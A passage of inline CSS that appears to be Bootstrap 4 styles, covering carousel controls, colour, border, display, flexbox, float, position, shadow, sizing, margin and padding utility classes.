      color: #fff;
      text-align: center;
      opacity: .5
    }

    .carousel-control-next:focus,
    .carousel-control-next:hover,
    .carousel-control-prev:focus,
    .carousel-control-prev:hover {
      color: #fff;
      text-decoration: none;
      outline: 0;
      opacity: .9
    }

    .carousel-control-prev {
      left: 0
    }

    .carousel-control-next {
      right: 0
    }

    .carousel-control-next-icon,
    .carousel-control-prev-icon {
      display: inline-block;
      width: 20px;
      height: 20px;
      background: transparent no-repeat center center;
      background-size: 100% 100%
    }

    .carousel-control-prev-icon {
      background-image: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' viewBox='0 0 8 8'%3E%3Cpath d='M5.25 0l-4 4 4 4 1.5-1.5-2.5-2.5 2.5-2.5-1.5-1.5z'/%3E%3C/svg%3E")
    }

    .carousel-control-next-icon {
      background-image: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' viewBox='0 0 8 8'%3E%3Cpath d='M2.75 0l-1.5 1.5 2.5 2.5-2.5 2.5 1.5 1.5 4-4-4-4z'/%3E%3C/svg%3E")
    }

    .carousel-indicators {
      position: absolute;
      right: 0;
      bottom: 10px;
      left: 0;
      z-index: 15;
      display: -ms-flexbox;
      display: flex;
      -ms-flex-pack: center;
      justify-content: center;
      padding-left: 0;
      margin-right: 15%;
      margin-left: 15%;
      list-style: none
    }

    .carousel-indicators li {
      position: relative;
      -ms-flex: 0 1 auto;
      flex: 0 1 auto;
      width: 30px;
      height: 3px;
      margin-right: 3px;
      margin-left: 3px;
      text-indent: -999px;
      cursor: pointer;
      background-color: rgba(255, 255, 255, .5)
    }

    .carousel-indicators li::before {
      position: absolute;
      top: -10px;
      left: 0;
      display: inline-block;
      width: 100%;
      height: 10px;
      content: ""
    }

    .carousel-indicators li::after {
      position: absolute;
      bottom: -10px;
      left: 0;
      display: inline-block;
      width: 100%;
      height: 10px;
      content: ""
    }

    .carousel-indicators .active {
      background-color: #fff
    }

    .carousel-caption {
      position: absolute;
      right: 15%;
      bottom: 20px;
      left: 15%;
      z-index: 10;
      padding-top: 20px;
      padding-bottom: 20px;
      color: #fff;
      text-align: center
    }

    .align-baseline {
      vertical-align: baseline !important
    }

    .align-top {
      vertical-align: top !important
    }

    .align-middle {
      vertical-align: middle !important
    }

    .align-bottom {
      vertical-align: bottom !important
    }

    .align-text-bottom {
      vertical-align: text-bottom !important
    }

    .align-text-top {
      vertical-align: text-top !important
    }

    .bg-primary {
      background-color: #007bff !important
    }

    a.bg-primary:focus,
    a.bg-primary:hover,
    button.bg-primary:focus,
    button.bg-primary:hover {
      background-color: #0062cc !important
    }

    .bg-secondary {
      background-color: #6c757d !important
    }

    a.bg-secondary:focus,
    a.bg-secondary:hover,
    button.bg-secondary:focus,
    button.bg-secondary:hover {
      background-color: #545b62 !important
    }

    .bg-success {
      background-color: #28a745 !important
    }

    a.bg-success:focus,
    a.bg-success:hover,
    button.bg-success:focus,
    button.bg-success:hover {
      background-color: #1e7e34 !important
    }

    .bg-info {
      background-color: #17a2b8 !important
    }

    a.bg-info:focus,
    a.bg-info:hover,
    button.bg-info:focus,
    button.bg-info:hover {
      background-color: #117a8b !important
    }

    .bg-warning {
      background-color: #ffc107 !important
    }

    a.bg-warning:focus,
    a.bg-warning:hover,
    button.bg-warning:focus,
    button.bg-warning:hover {
      background-color: #d39e00 !important
    }

    .bg-danger {
      background-color: #dc3545 !important
    }

    a.bg-danger:focus,
    a.bg-danger:hover,
    button.bg-danger:focus,
    button.bg-danger:hover {
      background-color: #bd2130 !important
    }

    .bg-light {
      background-color: #f8f9fa !important
    }

    a.bg-light:focus,
    a.bg-light:hover,
    button.bg-light:focus,
    button.bg-light:hover {
      background-color: #dae0e5 !important
    }

    .bg-dark {
      background-color: #343a40 !important
    }

    a.bg-dark:focus,
    a.bg-dark:hover,
    button.bg-dark:focus,
    button.bg-dark:hover {
      background-color: #1d2124 !important
    }

    .bg-white {
      background-color: #fff !important
    }

    .bg-transparent {
      background-color: transparent !important
    }

    .border {
      border: 1px solid #dee2e6 !important
    }

    .border-top {
      border-top: 1px solid #dee2e6 !important
    }

    .border-right {
      border-right: 1px solid #dee2e6 !important
    }

    .border-bottom {
      border-bottom: 1px solid #dee2e6 !important
    }

    .border-left {
      border-left: 1px solid #dee2e6 !important
    }

    .border-0 {
      border: 0 !important
    }

    .border-top-0 {
      border-top: 0 !important
    }

    .border-right-0 {
      border-right: 0 !important
    }

    .border-bottom-0 {
      border-bottom: 0 !important
    }

    .border-left-0 {
      border-left: 0 !important
    }

    .border-primary {
      border-color: #007bff !important
    }

    .border-secondary {
      border-color: #6c757d !important
    }

    .border-success {
      border-color: #28a745 !important
    }

    .border-info {
      border-color: #17a2b8 !important
    }

    .border-warning {
      border-color: #ffc107 !important
    }

    .border-danger {
      border-color: #dc3545 !important
    }

    .border-light {
      border-color: #f8f9fa !important
    }

    .border-dark {
      border-color: #343a40 !important
    }

    .border-white {
      border-color: #fff !important
    }

    .rounded {
      border-radius: .25rem !important
    }

    .rounded-top {
      border-top-left-radius: .25rem !important;
      border-top-right-radius: .25rem !important
    }

    .rounded-right {
      border-top-right-radius: .25rem !important;
      border-bottom-right-radius: .25rem !important
    }

    .rounded-bottom {
      border-bottom-right-radius: .25rem !important;
      border-bottom-left-radius: .25rem !important
    }

    .rounded-left {
      border-top-left-radius: .25rem !important;
      border-bottom-left-radius: .25rem !important
    }

    .rounded-circle {
      border-radius: 50% !important
    }

    .rounded-0 {
      border-radius: 0 !important
    }

    .clearfix::after {
      display: block;
      clear: both;
      content: ""
    }

    .d-none {
      display: none !important
    }

    .d-inline {
      display: inline !important
    }

    .d-inline-block {
      display: inline-block !important
    }

    .d-block {
      display: block !important
    }

    .d-table {
      display: table !important
    }

    .d-table-row {
      display: table-row !important
    }

    .d-table-cell {
      display: table-cell !important
    }

    .d-flex {
      display: -ms-flexbox !important;
      display: flex !important
    }

    .d-inline-flex {
      display: -ms-inline-flexbox !important;
      display: inline-flex !important
    }

    @media (min-width:576px) {
      .d-sm-none {
        display: none !important
      }

      .d-sm-inline {
        display: inline !important
      }

      .d-sm-inline-block {
        display: inline-block !important
      }

      .d-sm-block {
        display: block !important
      }

      .d-sm-table {
        display: table !important
      }

      .d-sm-table-row {
        display: table-row !important
      }

      .d-sm-table-cell {
        display: table-cell !important
      }

      .d-sm-flex {
        display: -ms-flexbox !important;
        display: flex !important
      }

      .d-sm-inline-flex {
        display: -ms-inline-flexbox !important;
        display: inline-flex !important
      }
    }

    @media (min-width:768px) {
      .d-md-none {
        display: none !important
      }

      .d-md-inline {
        display: inline !important
      }

      .d-md-inline-block {
        display: inline-block !important
      }

      .d-md-block {
        display: block !important
      }

      .d-md-table {
        display: table !important
      }

      .d-md-table-row {
        display: table-row !important
      }

      .d-md-table-cell {
        display: table-cell !important
      }

      .d-md-flex {
        display: -ms-flexbox !important;
        display: flex !important
      }

      .d-md-inline-flex {
        display: -ms-inline-flexbox !important;
        display: inline-flex !important
      }
    }

    @media (min-width:992px) {
      .d-lg-none {
        display: none !important
      }

      .d-lg-inline {
        display: inline !important
      }

      .d-lg-inline-block {
        display: inline-block !important
      }

      .d-lg-block {
        display: block !important
      }

      .d-lg-table {
        display: table !important
      }

      .d-lg-table-row {
        display: table-row !important
      }

      .d-lg-table-cell {
        display: table-cell !important
      }

      .d-lg-flex {
        display: -ms-flexbox !important;
        display: flex !important
      }

      .d-lg-inline-flex {
        display: -ms-inline-flexbox !important;
        display: inline-flex !important
      }
    }

    @media (min-width:1200px) {
      .d-xl-none {
        display: none !important
      }

      .d-xl-inline {
        display: inline !important
      }

      .d-xl-inline-block {
        display: inline-block !important
      }

      .d-xl-block {
        display: block !important
      }

      .d-xl-table {
        display: table !important
      }

      .d-xl-table-row {
        display: table-row !important
      }

      .d-xl-table-cell {
        display: table-cell !important
      }

      .d-xl-flex {
        display: -ms-flexbox !important;
        display: flex !important
      }

      .d-xl-inline-flex {
        display: -ms-inline-flexbox !important;
        display: inline-flex !important
      }
    }

    @media print {
      .d-print-none {
        display: none !important
      }

      .d-print-inline {
        display: inline !important
      }

      .d-print-inline-block {
        display: inline-block !important
      }

      .d-print-block {
        display: block !important
      }

      .d-print-table {
        display: table !important
      }

      .d-print-table-row {
        display: table-row !important
      }

      .d-print-table-cell {
        display: table-cell !important
      }

      .d-print-flex {
        display: -ms-flexbox !important;
        display: flex !important
      }

      .d-print-inline-flex {
        display: -ms-inline-flexbox !important;
        display: inline-flex !important
      }
    }

    .embed-responsive {
      position: relative;
      display: block;
      width: 100%;
      padding: 0;
      overflow: hidden
    }

    .embed-responsive::before {
      display: block;
      content: ""
    }

    .embed-responsive .embed-responsive-item,
    .embed-responsive embed,
    .embed-responsive iframe,
    .embed-responsive object,
    .embed-responsive video {
      position: absolute;
      top: 0;
      bottom: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: 0
    }

    .embed-responsive-21by9::before {
      padding-top: 42.857143%
    }

    .embed-responsive-16by9::before {
      padding-top: 56.25%
    }

    .embed-responsive-4by3::before {
      padding-top: 75%
    }

    .embed-responsive-1by1::before {
      padding-top: 100%
    }

    .flex-row {
      -ms-flex-direction: row !important;
      flex-direction: row !important
    }

    .flex-column {
      -ms-flex-direction: column !important;
      flex-direction: column !important
    }

    .flex-row-reverse {
      -ms-flex-direction: row-reverse !important;
      flex-direction: row-reverse !important
    }

    .flex-column-reverse {
      -ms-flex-direction: column-reverse !important;
      flex-direction: column-reverse !important
    }

    .flex-wrap {
      -ms-flex-wrap: wrap !important;
      flex-wrap: wrap !important
    }

    .flex-nowrap {
      -ms-flex-wrap: nowrap !important;
      flex-wrap: nowrap !important
    }

    .flex-wrap-reverse {
      -ms-flex-wrap: wrap-reverse !important;
      flex-wrap: wrap-reverse !important
    }

    .flex-fill {
      -ms-flex: 1 1 auto !important;
      flex: 1 1 auto !important
    }

    .flex-grow-0 {
      -ms-flex-positive: 0 !important;
      flex-grow: 0 !important
    }

    .flex-grow-1 {
      -ms-flex-positive: 1 !important;
      flex-grow: 1 !important
    }

    .flex-shrink-0 {
      -ms-flex-negative: 0 !important;
      flex-shrink: 0 !important
    }

    .flex-shrink-1 {
      -ms-flex-negative: 1 !important;
      flex-shrink: 1 !important
    }

    .justify-content-start {
      -ms-flex-pack: start !important;
      justify-content: flex-start !important
    }

    .justify-content-end {
      -ms-flex-pack: end !important;
      justify-content: flex-end !important
    }

    .justify-content-center {
      -ms-flex-pack: center !important;
      justify-content: center !important
    }

    .justify-content-between {
      -ms-flex-pack: justify !important;
      justify-content: space-between !important
    }

    .justify-content-around {
      -ms-flex-pack: distribute !important;
      justify-content: space-around !important
    }

    .align-items-start {
      -ms-flex-align: start !important;
      align-items: flex-start !important
    }

    .align-items-end {
      -ms-flex-align: end !important;
      align-items: flex-end !important
    }

    .align-items-center {
      -ms-flex-align: center !important;
      align-items: center !important
    }

    .align-items-baseline {
      -ms-flex-align: baseline !important;
      align-items: baseline !important
    }

    .align-items-stretch {
      -ms-flex-align: stretch !important;
      align-items: stretch !important
    }

    .align-content-start {
      -ms-flex-line-pack: start !important;
      align-content: flex-start !important
    }

    .align-content-end {
      -ms-flex-line-pack: end !important;
      align-content: flex-end !important
    }

    .align-content-center {
      -ms-flex-line-pack: center !important;
      align-content: center !important
    }

    .align-content-between {
      -ms-flex-line-pack: justify !important;
      align-content: space-between !important
    }

    .align-content-around {
      -ms-flex-line-pack: distribute !important;
      align-content: space-around !important
    }

    .align-content-stretch {
      -ms-flex-line-pack: stretch !important;
      align-content: stretch !important
    }

    .align-self-auto {
      -ms-flex-item-align: auto !important;
      align-self: auto !important
    }

    .align-self-start {
      -ms-flex-item-align: start !important;
      align-self: flex-start !important
    }

    .align-self-end {
      -ms-flex-item-align: end !important;
      align-self: flex-end !important
    }

    .align-self-center {
      -ms-flex-item-align: center !important;
      align-self: center !important
    }

    .align-self-baseline {
      -ms-flex-item-align: baseline !important;
      align-self: baseline !important
    }

    .align-self-stretch {
      -ms-flex-item-align: stretch !important;
      align-self: stretch !important
    }

    @media (min-width:576px) {
      .flex-sm-row {
        -ms-flex-direction: row !important;
        flex-direction: row !important
      }

      .flex-sm-column {
        -ms-flex-direction: column !important;
        flex-direction: column !important
      }

      .flex-sm-row-reverse {
        -ms-flex-direction: row-reverse !important;
        flex-direction: row-reverse !important
      }

      .flex-sm-column-reverse {
        -ms-flex-direction: column-reverse !important;
        flex-direction: column-reverse !important
      }

      .flex-sm-wrap {
        -ms-flex-wrap: wrap !important;
        flex-wrap: wrap !important
      }

      .flex-sm-nowrap {
        -ms-flex-wrap: nowrap !important;
        flex-wrap: nowrap !important
      }

      .flex-sm-wrap-reverse {
        -ms-flex-wrap: wrap-reverse !important;
        flex-wrap: wrap-reverse !important
      }

      .flex-sm-fill {
        -ms-flex: 1 1 auto !important;
        flex: 1 1 auto !important
      }

      .flex-sm-grow-0 {
        -ms-flex-positive: 0 !important;
        flex-grow: 0 !important
      }

      .flex-sm-grow-1 {
        -ms-flex-positive: 1 !important;
        flex-grow: 1 !important
      }

      .flex-sm-shrink-0 {
        -ms-flex-negative: 0 !important;
        flex-shrink: 0 !important
      }

      .flex-sm-shrink-1 {
        -ms-flex-negative: 1 !important;
        flex-shrink: 1 !important
      }

      .justify-content-sm-start {
        -ms-flex-pack: start !important;
        justify-content: flex-start !important
      }

      .justify-content-sm-end {
        -ms-flex-pack: end !important;
        justify-content: flex-end !important
      }

      .justify-content-sm-center {
        -ms-flex-pack: center !important;
        justify-content: center !important
      }

      .justify-content-sm-between {
        -ms-flex-pack: justify !important;
        justify-content: space-between !important
      }

      .justify-content-sm-around {
        -ms-flex-pack: distribute !important;
        justify-content: space-around !important
      }

      .align-items-sm-start {
        -ms-flex-align: start !important;
        align-items: flex-start !important
      }

      .align-items-sm-end {
        -ms-flex-align: end !important;
        align-items: flex-end !important
      }

      .align-items-sm-center {
        -ms-flex-align: center !important;
        align-items: center !important
      }

      .align-items-sm-baseline {
        -ms-flex-align: baseline !important;
        align-items: baseline !important
      }

      .align-items-sm-stretch {
        -ms-flex-align: stretch !important;
        align-items: stretch !important
      }

      .align-content-sm-start {
        -ms-flex-line-pack: start !important;
        align-content: flex-start !important
      }

      .align-content-sm-end {
        -ms-flex-line-pack: end !important;
        align-content: flex-end !important
      }

      .align-content-sm-center {
        -ms-flex-line-pack: center !important;
        align-content: center !important
      }

      .align-content-sm-between {
        -ms-flex-line-pack: justify !important;
        align-content: space-between !important
      }

      .align-content-sm-around {
        -ms-flex-line-pack: distribute !important;
        align-content: space-around !important
      }

      .align-content-sm-stretch {
        -ms-flex-line-pack: stretch !important;
        align-content: stretch !important
      }

      .align-self-sm-auto {
        -ms-flex-item-align: auto !important;
        align-self: auto !important
      }

      .align-self-sm-start {
        -ms-flex-item-align: start !important;
        align-self: flex-start !important
      }

      .align-self-sm-end {
        -ms-flex-item-align: end !important;
        align-self: flex-end !important
      }

      .align-self-sm-center {
        -ms-flex-item-align: center !important;
        align-self: center !important
      }

      .align-self-sm-baseline {
        -ms-flex-item-align: baseline !important;
        align-self: baseline !important
      }

      .align-self-sm-stretch {
        -ms-flex-item-align: stretch !important;
        align-self: stretch !important
      }
    }

    @media (min-width:768px) {
      .flex-md-row {
        -ms-flex-direction: row !important;
        flex-direction: row !important
      }

      .flex-md-column {
        -ms-flex-direction: column !important;
        flex-direction: column !important
      }

      .flex-md-row-reverse {
        -ms-flex-direction: row-reverse !important;
        flex-direction: row-reverse !important
      }

      .flex-md-column-reverse {
        -ms-flex-direction: column-reverse !important;
        flex-direction: column-reverse !important
      }

      .flex-md-wrap {
        -ms-flex-wrap: wrap !important;
        flex-wrap: wrap !important
      }

      .flex-md-nowrap {
        -ms-flex-wrap: nowrap !important;
        flex-wrap: nowrap !important
      }

      .flex-md-wrap-reverse {
        -ms-flex-wrap: wrap-reverse !important;
        flex-wrap: wrap-reverse !important
      }

      .flex-md-fill {
        -ms-flex: 1 1 auto !important;
        flex: 1 1 auto !important
      }

      .flex-md-grow-0 {
        -ms-flex-positive: 0 !important;
        flex-grow: 0 !important
      }

      .flex-md-grow-1 {
        -ms-flex-positive: 1 !important;
        flex-grow: 1 !important
      }

      .flex-md-shrink-0 {
        -ms-flex-negative: 0 !important;
        flex-shrink: 0 !important
      }

      .flex-md-shrink-1 {
        -ms-flex-negative: 1 !important;
        flex-shrink: 1 !important
      }

      .justify-content-md-start {
        -ms-flex-pack: start !important;
        justify-content: flex-start !important
      }

      .justify-content-md-end {
        -ms-flex-pack: end !important;
        justify-content: flex-end !important
      }

      .justify-content-md-center {
        -ms-flex-pack: center !important;
        justify-content: center !important
      }

      .justify-content-md-between {
        -ms-flex-pack: justify !important;
        justify-content: space-between !important
      }

      .justify-content-md-around {
        -ms-flex-pack: distribute !important;
        justify-content: space-around !important
      }

      .align-items-md-start {
        -ms-flex-align: start !important;
        align-items: flex-start !important
      }

      .align-items-md-end {
        -ms-flex-align: end !important;
        align-items: flex-end !important
      }

      .align-items-md-center {
        -ms-flex-align: center !important;
        align-items: center !important
      }

      .align-items-md-baseline {
        -ms-flex-align: baseline !important;
        align-items: baseline !important
      }

      .align-items-md-stretch {
        -ms-flex-align: stretch !important;
        align-items: stretch !important
      }

      .align-content-md-start {
        -ms-flex-line-pack: start !important;
        align-content: flex-start !important
      }

      .align-content-md-end {
        -ms-flex-line-pack: end !important;
        align-content: flex-end !important
      }

      .align-content-md-center {
        -ms-flex-line-pack: center !important;
        align-content: center !important
      }

      .align-content-md-between {
        -ms-flex-line-pack: justify !important;
        align-content: space-between !important
      }

      .align-content-md-around {
        -ms-flex-line-pack: distribute !important;
        align-content: space-around !important
      }

      .align-content-md-stretch {
        -ms-flex-line-pack: stretch !important;
        align-content: stretch !important
      }

      .align-self-md-auto {
        -ms-flex-item-align: auto !important;
        align-self: auto !important
      }

      .align-self-md-start {
        -ms-flex-item-align: start !important;
        align-self: flex-start !important
      }

      .align-self-md-end {
        -ms-flex-item-align: end !important;
        align-self: flex-end !important
      }

      .align-self-md-center {
        -ms-flex-item-align: center !important;
        align-self: center !important
      }

      .align-self-md-baseline {
        -ms-flex-item-align: baseline !important;
        align-self: baseline !important
      }

      .align-self-md-stretch {
        -ms-flex-item-align: stretch !important;
        align-self: stretch !important
      }
    }

    @media (min-width:992px) {
      .flex-lg-row {
        -ms-flex-direction: row !important;
        flex-direction: row !important
      }

      .flex-lg-column {
        -ms-flex-direction: column !important;
        flex-direction: column !important
      }

      .flex-lg-row-reverse {
        -ms-flex-direction: row-reverse !important;
        flex-direction: row-reverse !important
      }

      .flex-lg-column-reverse {
        -ms-flex-direction: column-reverse !important;
        flex-direction: column-reverse !important
      }

      .flex-lg-wrap {
        -ms-flex-wrap: wrap !important;
        flex-wrap: wrap !important
      }

      .flex-lg-nowrap {
        -ms-flex-wrap: nowrap !important;
        flex-wrap: nowrap !important
      }

      .flex-lg-wrap-reverse {
        -ms-flex-wrap: wrap-reverse !important;
        flex-wrap: wrap-reverse !important
      }

      .flex-lg-fill {
        -ms-flex: 1 1 auto !important;
        flex: 1 1 auto !important
      }

      .flex-lg-grow-0 {
        -ms-flex-positive: 0 !important;
        flex-grow: 0 !important
      }

      .flex-lg-grow-1 {
        -ms-flex-positive: 1 !important;
        flex-grow: 1 !important
      }

      .flex-lg-shrink-0 {
        -ms-flex-negative: 0 !important;
        flex-shrink: 0 !important
      }

      .flex-lg-shrink-1 {
        -ms-flex-negative: 1 !important;
        flex-shrink: 1 !important
      }

      .justify-content-lg-start {
        -ms-flex-pack: start !important;
        justify-content: flex-start !important
      }

      .justify-content-lg-end {
        -ms-flex-pack: end !important;
        justify-content: flex-end !important
      }

      .justify-content-lg-center {
        -ms-flex-pack: center !important;
        justify-content: center !important
      }

      .justify-content-lg-between {
        -ms-flex-pack: justify !important;
        justify-content: space-between !important
      }

      .justify-content-lg-around {
        -ms-flex-pack: distribute !important;
        justify-content: space-around !important
      }

      .align-items-lg-start {
        -ms-flex-align: start !important;
        align-items: flex-start !important
      }

      .align-items-lg-end {
        -ms-flex-align: end !important;
        align-items: flex-end !important
      }

      .align-items-lg-center {
        -ms-flex-align: center !important;
        align-items: center !important
      }

      .align-items-lg-baseline {
        -ms-flex-align: baseline !important;
        align-items: baseline !important
      }

      .align-items-lg-stretch {
        -ms-flex-align: stretch !important;
        align-items: stretch !important
      }

      .align-content-lg-start {
        -ms-flex-line-pack: start !important;
        align-content: flex-start !important
      }

      .align-content-lg-end {
        -ms-flex-line-pack: end !important;
        align-content: flex-end !important
      }

      .align-content-lg-center {
        -ms-flex-line-pack: center !important;
        align-content: center !important
      }

      .align-content-lg-between {
        -ms-flex-line-pack: justify !important;
        align-content: space-between !important
      }

      .align-content-lg-around {
        -ms-flex-line-pack: distribute !important;
        align-content: space-around !important
      }

      .align-content-lg-stretch {
        -ms-flex-line-pack: stretch !important;
        align-content: stretch !important
      }

      .align-self-lg-auto {
        -ms-flex-item-align: auto !important;
        align-self: auto !important
      }

      .align-self-lg-start {
        -ms-flex-item-align: start !important;
        align-self: flex-start !important
      }

      .align-self-lg-end {
        -ms-flex-item-align: end !important;
        align-self: flex-end !important
      }

      .align-self-lg-center {
        -ms-flex-item-align: center !important;
        align-self: center !important
      }

      .align-self-lg-baseline {
        -ms-flex-item-align: baseline !important;
        align-self: baseline !important
      }

      .align-self-lg-stretch {
        -ms-flex-item-align: stretch !important;
        align-self: stretch !important
      }
    }

    @media (min-width:1200px) {
      .flex-xl-row {
        -ms-flex-direction: row !important;
        flex-direction: row !important
      }

      .flex-xl-column {
        -ms-flex-direction: column !important;
        flex-direction: column !important
      }

      .flex-xl-row-reverse {
        -ms-flex-direction: row-reverse !important;
        flex-direction: row-reverse !important
      }

      .flex-xl-column-reverse {
        -ms-flex-direction: column-reverse !important;
        flex-direction: column-reverse !important
      }

      .flex-xl-wrap {
        -ms-flex-wrap: wrap !important;
        flex-wrap: wrap !important
      }

      .flex-xl-nowrap {
        -ms-flex-wrap: nowrap !important;
        flex-wrap: nowrap !important
      }

      .flex-xl-wrap-reverse {
        -ms-flex-wrap: wrap-reverse !important;
        flex-wrap: wrap-reverse !important
      }

      .flex-xl-fill {
        -ms-flex: 1 1 auto !important;
        flex: 1 1 auto !important
      }

      .flex-xl-grow-0 {
        -ms-flex-positive: 0 !important;
        flex-grow: 0 !important
      }

      .flex-xl-grow-1 {
        -ms-flex-positive: 1 !important;
        flex-grow: 1 !important
      }

      .flex-xl-shrink-0 {
        -ms-flex-negative: 0 !important;
        flex-shrink: 0 !important
      }

      .flex-xl-shrink-1 {
        -ms-flex-negative: 1 !important;
        flex-shrink: 1 !important
      }

      .justify-content-xl-start {
        -ms-flex-pack: start !important;
        justify-content: flex-start !important
      }

      .justify-content-xl-end {
        -ms-flex-pack: end !important;
        justify-content: flex-end !important
      }

      .justify-content-xl-center {
        -ms-flex-pack: center !important;
        justify-content: center !important
      }

      .justify-content-xl-between {
        -ms-flex-pack: justify !important;
        justify-content: space-between !important
      }

      .justify-content-xl-around {
        -ms-flex-pack: distribute !important;
        justify-content: space-around !important
      }

      .align-items-xl-start {
        -ms-flex-align: start !important;
        align-items: flex-start !important
      }

      .align-items-xl-end {
        -ms-flex-align: end !important;
        align-items: flex-end !important
      }

      .align-items-xl-center {
        -ms-flex-align: center !important;
        align-items: center !important
      }

      .align-items-xl-baseline {
        -ms-flex-align: baseline !important;
        align-items: baseline !important
      }

      .align-items-xl-stretch {
        -ms-flex-align: stretch !important;
        align-items: stretch !important
      }

      .align-content-xl-start {
        -ms-flex-line-pack: start !important;
        align-content: flex-start !important
      }

      .align-content-xl-end {
        -ms-flex-line-pack: end !important;
        align-content: flex-end !important
      }

      .align-content-xl-center {
        -ms-flex-line-pack: center !important;
        align-content: center !important
      }

      .align-content-xl-between {
        -ms-flex-line-pack: justify !important;
        align-content: space-between !important
      }

      .align-content-xl-around {
        -ms-flex-line-pack: distribute !important;
        align-content: space-around !important
      }

      .align-content-xl-stretch {
        -ms-flex-line-pack: stretch !important;
        align-content: stretch !important
      }

      .align-self-xl-auto {
        -ms-flex-item-align: auto !important;
        align-self: auto !important
      }

      .align-self-xl-start {
        -ms-flex-item-align: start !important;
        align-self: flex-start !important
      }

      .align-self-xl-end {
        -ms-flex-item-align: end !important;
        align-self: flex-end !important
      }

      .align-self-xl-center {
        -ms-flex-item-align: center !important;
        align-self: center !important
      }

      .align-self-xl-baseline {
        -ms-flex-item-align: baseline !important;
        align-self: baseline !important
      }

      .align-self-xl-stretch {
        -ms-flex-item-align: stretch !important;
        align-self: stretch !important
      }
    }

    .float-left {
      float: left !important
    }

    .float-right {
      float: right !important
    }

    .float-none {
      float: none !important
    }

    @media (min-width:576px) {
      .float-sm-left {
        float: left !important
      }

      .float-sm-right {
        float: right !important
      }

      .float-sm-none {
        float: none !important
      }
    }

    @media (min-width:768px) {
      .float-md-left {
        float: left !important
      }

      .float-md-right {
        float: right !important
      }

      .float-md-none {
        float: none !important
      }
    }

    @media (min-width:992px) {
      .float-lg-left {
        float: left !important
      }

      .float-lg-right {
        float: right !important
      }

      .float-lg-none {
        float: none !important
      }
    }

    @media (min-width:1200px) {
      .float-xl-left {
        float: left !important
      }

      .float-xl-right {
        float: right !important
      }

      .float-xl-none {
        float: none !important
      }
    }

    .position-static {
      position: static !important
    }

    .position-relative {
      position: relative !important
    }

    .position-absolute {
      position: absolute !important
    }

    .position-fixed {
      position: fixed !important
    }

    .position-sticky {
      position: -webkit-sticky !important;
      position: sticky !important
    }

    .fixed-top {
      position: fixed;
      top: 0;
      right: 0;
      left: 0;
      z-index: 1030
    }

    .fixed-bottom {
      position: fixed;
      right: 0;
      bottom: 0;
      left: 0;
      z-index: 1030
    }

    @supports ((position:-webkit-sticky) or (position:sticky)) {
      .sticky-top {
        position: -webkit-sticky;
        position: sticky;
        top: 0;
        z-index: 1020
      }
    }

    .sr-only {
      position: absolute;
      width: 1px;
      height: 1px;
      padding: 0;
      overflow: hidden;
      clip: rect(0, 0, 0, 0);
      white-space: nowrap;
      border: 0
    }

    .sr-only-focusable:active,
    .sr-only-focusable:focus {
      position: static;
      width: auto;
      height: auto;
      overflow: visible;
      clip: auto;
      white-space: normal
    }

    .shadow-sm {
      box-shadow: 0 .125rem .25rem rgba(0, 0, 0, .075) !important
    }

    .shadow {
      box-shadow: 0 .5rem 1rem rgba(0, 0, 0, .15) !important
    }

    .shadow-lg {
      box-shadow: 0 1rem 3rem rgba(0, 0, 0, .175) !important
    }

    .shadow-none {
      box-shadow: none !important
    }

    .w-25 {
      width: 25% !important
    }

    .w-50 {
      width: 50% !important
    }

    .w-75 {
      width: 75% !important
    }

    .w-100 {
      width: 100% !important
    }

    .w-auto {
      width: auto !important
    }

    .h-25 {
      height: 25% !important
    }

    .h-50 {
      height: 50% !important
    }

    .h-75 {
      height: 75% !important
    }

    .h-100 {
      height: 100% !important
    }

    .h-auto {
      height: auto !important
    }

    .mw-100 {
      max-width: 100% !important
    }

    .mh-100 {
      max-height: 100% !important
    }

    .m-0 {
      margin: 0 !important
    }

    .mt-0,
    .my-0 {
      margin-top: 0 !important
    }

    .mr-0,
    .mx-0 {
      margin-right: 0 !important
    }

    .mb-0,
    .my-0 {
      margin-bottom: 0 !important
    }

    .ml-0,
    .mx-0 {
      margin-left: 0 !important
    }

    .m-1 {
      margin: .25rem !important
    }

    .mt-1,
    .my-1 {
      margin-top: .25rem !important
    }

    .mr-1,
    .mx-1 {
      margin-right: .25rem !important
    }

    .mb-1,
    .my-1 {
      margin-bottom: .25rem !important
    }

    .ml-1,
    .mx-1 {
      margin-left: .25rem !important
    }

    .m-2 {
      margin: .5rem !important
    }

    .mt-2,
    .my-2 {
      margin-top: .5rem !important
    }

    .mr-2,
    .mx-2 {
      margin-right: .5rem !important
    }

    .mb-2,
    .my-2 {
      margin-bottom: .5rem !important
    }

    .ml-2,
    .mx-2 {
      margin-left: .5rem !important
    }

    .m-3 {
      margin: 1rem !important
    }

    .mt-3,
    .my-3 {
      margin-top: 1rem !important
    }

    .mr-3,
    .mx-3 {
      margin-right: 1rem !important
    }

    .mb-3,
    .my-3 {
      margin-bottom: 1rem !important
    }

    .ml-3,
    .mx-3 {
      margin-left: 1rem !important
    }

    .m-4 {
      margin: 1.5rem !important
    }

    .mt-4,
    .my-4 {
      margin-top: 1.5rem !important
    }

    .mr-4,
    .mx-4 {
      margin-right: 1.5rem !important
    }

    .mb-4,
    .my-4 {
      margin-bottom: 1.5rem !important
    }

    .ml-4,
    .mx-4 {
      margin-left: 1.5rem !important
    }

    .m-5 {
      margin: 3rem !important
    }

    .mt-5,
    .my-5 {
      margin-top: 3rem !important
    }

    .mr-5,
    .mx-5 {
      margin-right: 3rem !important
    }

    .mb-5,
    .my-5 {
      margin-bottom: 3rem !important
    }

    .ml-5,
    .mx-5 {
      margin-left: 3rem !important
    }

    .p-0 {
      padding: 0 !important
    }

    .pt-0,
    .py-0 {
      padding-top: 0 !important
    }

    .pr-0,
    .px-0 {
      padding-right: 0 !important
    }

    .pb-0,
    .py-0 {
      padding-bottom: 0 !important
    }

    .pl-0,
    .px-0 {
      padding-left: 0 !important
    }

    .p-1 {
      padding: .25rem !important
    }

    .pt-1,
    .py-1 {
      padding-top: .25rem !important
    }

    .pr-1,
    .px-1 {
      padding-right: .25rem !important
    }

    .pb-1,
    .py-1 {
      padding-bottom: .25rem !important
    }

    .pl-1,
    .px-1 {
      padding-left: .25rem !important
    }

    .p-2 {
      padding: .5rem !important
    }

    .pt-2,
    .py-2 {
      padding-top: .5rem !important
    }

    .pr-2,
    .px-2 {
      padding-right: .5rem !important
    }

    .pb-2,
    .py-2 {
      padding-bottom: .5rem !important
    }

